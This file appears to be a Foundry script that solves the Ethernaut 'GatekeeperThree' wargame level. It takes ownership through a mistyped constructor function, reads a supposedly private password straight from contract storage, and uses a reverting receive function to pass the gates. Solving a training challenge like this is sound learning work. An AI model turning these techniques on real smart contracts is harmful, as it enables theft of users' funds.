// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";

import {Test, console2} from "forge-std/Test.sol";

import {SimpleTrick, GatekeeperThree} from "../src/L29/GatekeeperThree.sol";

contract TestEvil_29 is Test, Script {
    GatekeeperThree t;

    function setUp() public {
        t = GatekeeperThree(
            payable(0x2E2ee25fE88f4dFF3C2531cCB1B8d937CA78Cd6D)
        );
    }

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        t.construct0r();
        t.createTrick();
        address a = address(t.trick());
        uint256 b = uint256(bytes32(vm.load(a, bytes32(uint256(2)))));
        t.getAllowance(b);
        address(t).call{value: 0.002 ether}("");
        t.enter();
        vm.stopBroadcast();
    }

    receive() external payable {
        revert("dadad");
    }
}
